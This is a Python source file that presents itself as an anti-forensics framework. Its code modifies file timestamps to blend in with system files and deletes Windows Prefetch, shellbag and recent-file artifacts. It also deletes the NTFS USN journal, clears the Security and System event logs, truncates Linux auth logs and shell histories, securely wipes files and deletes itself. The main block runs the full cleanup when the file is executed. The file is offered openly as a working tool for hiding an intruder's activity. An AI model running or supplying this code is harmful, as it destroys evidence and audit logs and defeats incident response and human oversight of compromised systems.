"""
Anti-Forensics Framework
Timestomping, artifact removal, trace cleanup
"""

import os
import sys
import struct
import subprocess
from typing import List, Dict, Optional
from dataclasses import dataclass
import time


class Timestomper:
    """Modify file timestamps to evade forensic analysis"""
    
    def __init__(self):
        self.modified_files = []
    
    def stomp(self, filepath: str, reference: str = None, 
              timestamp: float = None) -> bool:
        """
        Modify file timestamps
        
        Args:
            filepath: Target file
            reference: Copy timestamps from this file
            timestamp: Set to specific Unix timestamp
        """
        try:
            if reference and os.path.exists(reference):
                stat = os.stat(reference)
                atime, mtime = stat.st_atime, stat.st_mtime
            elif timestamp:
                atime = mtime = timestamp
            else:
                # Default: Windows install date
                atime = mtime = 1609459200  # 2021-01-01
            
            os.utime(filepath, (atime, mtime))
            self.modified_files.append(filepath)
            return True
        except:
            return False
    
    def stomp_directory(self, directory: str, reference: str = None) -> int:
        """Recursively stomp all files in directory"""
        count = 0
        for root, dirs, files in os.walk(directory):
            for f in files:
                if self.stomp(os.path.join(root, f), reference):
                    count += 1
        return count
    
    def match_system_files(self, filepath: str) -> bool:
        """Match timestamps to nearby system files"""
        if sys.platform == 'win32':
            ref = r"C:\Windows\System32\kernel32.dll"
        else:
            ref = "/bin/ls"
        return self.stomp(filepath, reference=ref)


class ArtifactRemover:
    """Remove forensic artifacts"""
    
    WINDOWS_ARTIFACTS = [
        r"%USERPROFILE%\AppData\Local\Microsoft\Windows\Explorer\thumbcache*.db",
        r"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Recent\*",
        r"%USERPROFILE%\AppData\Local\Microsoft\Windows\History\*",
        r"%SYSTEMROOT%\Prefetch\*.pf",
        r"%SYSTEMROOT%\AppCompat\Programs\RecentFileCache.bcf",
        r"%SYSTEMROOT%\AppCompat\Programs\Amcache.hve",
    ]
    
    LINUX_ARTIFACTS = [
        "~/.bash_history",
        "~/.zsh_history",
        "~/.lesshst",
        "~/.viminfo",
        "~/.python_history",
        "~/.wget-hsts",
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/messages",
    ]
    
    def __init__(self):
        self.removed = []
    
    def remove_prefetch(self) -> int:
        """Remove Windows Prefetch files"""
        if sys.platform != 'win32':
            return 0
        prefetch_dir = os.path.expandvars(r"%SYSTEMROOT%\Prefetch")
        count = 0
        try:
            for f in os.listdir(prefetch_dir):
                if f.endswith('.pf'):
                    os.remove(os.path.join(prefetch_dir, f))
                    count += 1
        except:
            pass
        return count
    
    def remove_recent_files(self) -> int:
        """Remove recent files list"""
        if sys.platform == 'win32':
            recent = os.path.expandvars(r"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Recent")
        else:
            recent = os.path.expanduser("~/.local/share/recently-used.xbel")
        
        count = 0
        try:
            if os.path.isdir(recent):
                for f in os.listdir(recent):
                    os.remove(os.path.join(recent, f))
                    count += 1
            elif os.path.isfile(recent):
                os.remove(recent)
                count = 1
        except:
            pass
        return count
    
    def remove_shellbags(self) -> bool:
        """Remove Windows Shellbag entries"""
        if sys.platform != 'win32':
            return False
        try:
            import winreg
            paths = [
                r"Software\Microsoft\Windows\Shell\BagMRU",
                r"Software\Microsoft\Windows\Shell\Bags",
            ]
            for path in paths:
                try:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, path)
                except:
                    pass
            return True
        except:
            return False
    
    def clear_usn_journal(self) -> bool:
        """Clear NTFS USN Journal"""
        if sys.platform != 'win32':
            return False
        try:
            subprocess.run(['fsutil', 'usn', 'deletejournal', '/d', 'C:'],
                          capture_output=True)
            return True
        except:
            return False
    
    def clear_event_logs(self) -> int:
        """Clear Windows Event Logs"""
        if sys.platform != 'win32':
            return 0
        logs = ['Application', 'Security', 'System', 'Setup']
        count = 0
        for log in logs:
            try:
                subprocess.run(['wevtutil', 'cl', log], capture_output=True)
                count += 1
            except:
                pass
        return count
    
    def clear_linux_logs(self) -> int:
        """Clear Linux log files"""
        if sys.platform == 'win32':
            return 0
        count = 0
        for artifact in self.LINUX_ARTIFACTS:
            path = os.path.expanduser(artifact)
            try:
                if os.path.exists(path):
                    with open(path, 'w') as f:
                        f.truncate(0)
                    count += 1
            except:
                pass
        return count


class MemoryCleaner:
    """Clean sensitive data from memory"""
    
    def __init__(self):
        pass
    
    def secure_delete_string(self, data: bytearray) -> None:
        """Overwrite string in memory"""
        for i in range(len(data)):
            data[i] = 0
    
    def clear_clipboard(self) -> bool:
        """Clear system clipboard"""
        if sys.platform == 'win32':
            try:
                import ctypes
                ctypes.windll.user32.OpenClipboard(0)
                ctypes.windll.user32.EmptyClipboard()
                ctypes.windll.user32.CloseClipboard()
                return True
            except:
                return False
        else:
            try:
                subprocess.run(['xclip', '-selection', 'clipboard', '/dev/null'],
                              capture_output=True)
                return True
            except:
                return False


class SecureDelete:
    """Secure file deletion with overwrite"""
    
    PASSES = 3  # DoD 5220.22-M standard
    
    def __init__(self, passes: int = 3):
        self.passes = passes
    
    def delete(self, filepath: str) -> bool:
        """Securely delete file with multiple overwrites"""
        try:
            size = os.path.getsize(filepath)
            
            with open(filepath, 'r+b') as f:
                for pass_num in range(self.passes):
                    f.seek(0)
                    if pass_num % 3 == 0:
                        f.write(b'\x00' * size)  # Zeros
                    elif pass_num % 3 == 1:
                        f.write(b'\xff' * size)  # Ones
                    else:
                        f.write(os.urandom(size))  # Random
                    f.flush()
                    os.fsync(f.fileno())
            
            os.remove(filepath)
            return True
        except:
            return False
    
    def delete_directory(self, directory: str) -> int:
        """Securely delete all files in directory"""
        count = 0
        for root, dirs, files in os.walk(directory, topdown=False):
            for f in files:
                if self.delete(os.path.join(root, f)):
                    count += 1
            for d in dirs:
                try:
                    os.rmdir(os.path.join(root, d))
                except:
                    pass
        try:
            os.rmdir(directory)
        except:
            pass
        return count


class AntiForensicsFramework:
    """Main anti-forensics orchestrator"""
    
    def __init__(self):
        self.timestomper = Timestomper()
        self.artifact_remover = ArtifactRemover()
        self.memory_cleaner = MemoryCleaner()
        self.secure_delete = SecureDelete()
    
    def full_cleanup(self) -> Dict[str, int]:
        """Perform full anti-forensics cleanup"""
        results = {
            'prefetch_removed': self.artifact_remover.remove_prefetch(),
            'recent_removed': self.artifact_remover.remove_recent_files(),
            'logs_cleared': 0,
        }
        
        if sys.platform == 'win32':
            results['logs_cleared'] = self.artifact_remover.clear_event_logs()
            self.artifact_remover.remove_shellbags()
            self.artifact_remover.clear_usn_journal()
        else:
            results['logs_cleared'] = self.artifact_remover.clear_linux_logs()
        
        self.memory_cleaner.clear_clipboard()
        
        return results
    
    def stealth_operation(self, files: List[str]) -> None:
        """Make operation files blend in"""
        for f in files:
            self.timestomper.match_system_files(f)
    
    def cleanup_and_exit(self, self_path: str = None) -> None:
        """Full cleanup including self-deletion"""
        self.full_cleanup()
        if self_path:
            self.secure_delete.delete(self_path)


if __name__ == "__main__":
    framework = AntiForensicsFramework()
    results = framework.full_cleanup()
    print(f"Cleanup results: {results}")
